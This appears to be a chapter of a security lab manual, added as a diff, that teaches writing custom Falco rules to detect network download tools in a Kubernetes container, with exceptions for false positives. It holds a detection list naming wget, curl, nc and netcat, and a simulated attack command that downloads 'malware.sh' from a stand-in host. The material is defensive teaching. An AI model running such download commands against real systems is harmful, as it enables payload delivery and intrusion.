@@ -1,0 +1,161 @@
+\chapter{Writing Custom Rules}
+
+One of the most powerful features of Falco is the ability to write custom rules to match the specific security baseline of your applications. While the default ruleset provided by Falco covers a wide array of generic attack patterns (e.g., spawning shells inside a container, reading sensitive files, opening unexpected network sockets), every application has its own unique and well-defined behavioral profile. Profiling an application and creating tailored rules drastically reduces false positives and establishes a tight security boundary based on the principle of \textit{least privilege at the system call level}.
+
+In this chapter, we will first examine the building blocks of Falco's rule language, then create and test a custom rule for our \texttt{zipapp} application, and finally explore the essential operational concept of exception handling to manage false positives in production environments.
+
+\section{The Building Blocks of Falco Rules}
+
+Falco's rule language is hierarchical. Rather than writing monolithic, complex conditions inside each rule, Falco encourages developers to decompose logic into three reusable primitives: \textbf{Lists}, \textbf{Macros}, and \textbf{Rules}. This structure promotes readability, reusability, and easy maintenance of the security policy.
+
+\subsection{Lists}
+
+A \textbf{list} is simply a named collection of items (strings), such as process names, file paths, or system calls. Lists are referenced inside macros and rules to keep conditions clean and easy to update. For example, instead of writing \texttt{proc.name = 'wget' or proc.name = 'curl'} directly in a rule condition, you define a list once:
+
+\begin{lstlisting}[language=bash]
+- list: network_tools
+  items: [wget, curl, nc, ncat, netcat]
+\end{lstlisting}
+
+This list can now be referenced anywhere as \texttt{proc.name in (network\_tools)}, making the policy self-documenting and easy to extend.
+
+\subsection{Macros}
+
+A \textbf{macro} is a named, reusable condition fragment. The default Falco ruleset ships with hundreds of macros like \texttt{spawned\_process}, \texttt{container}, or \texttt{never\_true} that abstract common patterns. You can override existing macros or create your own:
+
+\begin{lstlisting}[language=bash]
+- macro: in_zipapp_container
+  condition: container.name = 'zipapp'
+\end{lstlisting}
+
+Macros can themselves reference other macros and lists, enabling a powerful compositional approach.
+
+\subsection{Rules}
+
+A \textbf{rule} is the top-level detection unit and is composed of the following key fields:
+\begin{itemize}
+    \item \textbf{rule}: A short, unique name for the rule.
+    \item \textbf{desc}: A longer description of what the rule detects.
+    \item \textbf{condition}: A filtering expression (composed of fields, operators, macros, and lists) that determines when the rule is triggered.
+    \item \textbf{output}: The formatted string sent to the alert channel when the rule matches. It can include \textit{field accessors} (e.g., \texttt{\%proc.name}, \texttt{\%container.name}, \texttt{\%user.name}) to provide rich context.
+    \item \textbf{priority}: The severity level, ordered from low to high: \texttt{DEBUG}, \texttt{INFO}, \texttt{NOTICE}, \texttt{WARNING}, \texttt{ERROR}, \texttt{CRITICAL}.
+    \item \textbf{tags}: Optional labels for classification (e.g., by MITRE ATT\&CK technique).
+\end{itemize}
+
+\section{Creating a Custom Rule with Macros and Lists}
+
+Let's assume our security policy dictates that the \texttt{zipapp} container should \textit{never} execute network download utilities. In a zero-trust model, we must assume that an attacker who has gained code execution will immediately try to download secondary payloads, backdoors, or crypto-miners from an external Command and Control (C2) server. This post-exploitation pattern is known as the \textbf{Dropped Binary} attack and is classified under \textit{MITRE ATT\&CK T1105: Ingress Tool Transfer}.
+
+By catching this behavior, we intercept the attacker at a critical point in their kill chain, \textit{after} they have exploited the application but \textit{before} they can escalate the attack.
+
+Create a file named \texttt{custom-rules.yaml}. Notice how we use a dedicated list and a macro to keep the rule clean and composable:
+
+\begin{lstlisting}[language=bash]
+cat <<EOF > custom-rules.yaml
+customRules:
+  my_rules.yaml: |-
+    - list: prohibited_network_tools
+      items: [wget, curl, nc, ncat]
+
+    - macro: in_zipapp_container
+      condition: container.name = 'zipapp'
+
+    - rule: Detect Network Tools in zipapp
+      desc: >
+        Detects the execution of network download utilities inside the zipapp
+        container. This behavior is never expected for this application and
+        likely indicates a post-exploitation Dropped Binary attempt.
+      condition: >
+        spawned_process
+        and in_zipapp_container
+        and proc.name in (prohibited_network_tools)
+      output: >
+        Network download tool executed in zipapp container
+        (user=%user.name tool=%proc.name command=%proc.cmdline
+        container=%container.name image=%container.image.repository)
+      priority: WARNING
+      tags: [network, mitre_execution, T1105]
+EOF
+\end{lstlisting}
+
+Apply this custom rule to the running Falco deployment via Helm upgrade:
+
+\begin{lstlisting}[language=bash]
+helm upgrade falco falcosecurity/falco \
+  -n falco \
+  -f custom-rules.yaml \
+  --reuse-values
+\end{lstlisting}
+
+Wait a few moments for the Falco pods to restart with the new configuration, then verify:
+
+\begin{lstlisting}[language=bash]
+kubectl rollout status daemonset/falco -n falco
+\end{lstlisting}
+
+\section{Testing the Custom Rule}
+
+To test our rule, we will simulate the Dropped Binary scenario: an attacker who has already compromised the \texttt{zipapp} container and is now trying to download a secondary payload using \texttt{wget}.
+
+Execute the following command to directly spawn a shell inside the \texttt{zipapp} pod and invoke \texttt{wget}:
+
+\begin{lstlisting}[language=bash]
+kubectl exec -it deployment/zipapp -- bash -c \
+  'apt-get update -qq && apt-get install -y wget -qq && wget http://example.com/malware.sh'
+\end{lstlisting}
+
+Immediately check the Falco logs:
+
+\begin{lstlisting}[language=bash]
+kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
+\end{lstlisting}
+
+You should observe an alert matching the rule we just defined:
+
+\begin{lstlisting}[language=bash]
+Warning Detect Network Tools in zipapp | user=root tool=wget command=wget http://example.com/malware.sh container=zipapp image=zipapp
+\end{lstlisting}
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+\begin{itemize}
+    \item Did Falco trigger your custom rule? What is the full output string printed in the logs?
+    \item Try adding \texttt{curl} to your \texttt{prohibited\_network\_tools} list and re-run the Helm upgrade. Does Falco correctly detect \texttt{curl} as well?
+\end{itemize}
+\end{tcolorbox}
+
+\section{Exception Handling and False Positive Management}
+
+In production environments, a significant operational challenge is managing \textbf{false positives}: legitimate application behaviors that inadvertently trigger security rules. For example, consider a container where the application itself calls \texttt{curl} during a startup health-check, or where a background process periodically reads the service account token to refresh its authentication. Blocking or constantly alerting on these legitimate actions would create alert fatigue, causing security teams to miss real threats.
+
+Falco provides a first-class mechanism for this: the \textbf{exceptions} field. An exception allows you to carve out specific, well-defined conditions from an existing rule without modifying its core logic, keeping the policy clean and auditable.
+
+\subsection{Defining Exceptions}
+
+Suppose that we have a legitimate process, \texttt{healthcheck.sh}, that needs to call \texttt{curl} to probe an internal endpoint. We can add an exception to our rule as follows:
+
+\begin{lstlisting}[language=bash]
+- rule: Detect Network Tools in zipapp
+  exceptions:
+    - name: allow_healthcheck_curl
+      fields: [proc.name, proc.pname]
+      comps: [=, =]
+      values:
+        - [curl, healthcheck.sh]
+\end{lstlisting}
+
+This exception tells Falco: ``do not trigger this rule if the process name is \texttt{curl} \textbf{and} its parent process name is \texttt{healthcheck.sh}.'' Any other invocation of \texttt{curl} (e.g., from a \texttt{bash} parent, as an attacker would do) will still be caught.
+
+\subsection{The Operational Principle: Minimal Exception Surface}
+
+\begin{tcolorbox}[colback=blue!5!white,colframe=blue!75!black,title=Best Practice: Minimal Exception Surface]
+When writing exceptions, always aim for the \textbf{most specific condition possible}. A poorly written exception like ``allow \texttt{curl} if run by root'' would create a massive blind spot. A well-written exception is scoped to a precise combination of process name, parent process, and container name. The goal is to eliminate the false positive while \textit{preserving the detection surface} for all other variations of the attack.
+\end{tcolorbox}
+
+\begin{tcolorbox}[colback=green!5!white,colframe=green!75!black,title=Question]
+\begin{itemize}
+    \item Reflect on the \texttt{Read sensitive file untrusted} alert triggered in the previous chapter (Section~3.4). Could a legitimate microservice in a Kubernetes cluster ever need to read its own service account token? What would a safe and minimal exception look like for such a case?
+    \item What is the risk of being \textit{too permissive} in an exception? And of being \textit{too strict}?
+\end{itemize}
+\end{tcolorbox}
+
+
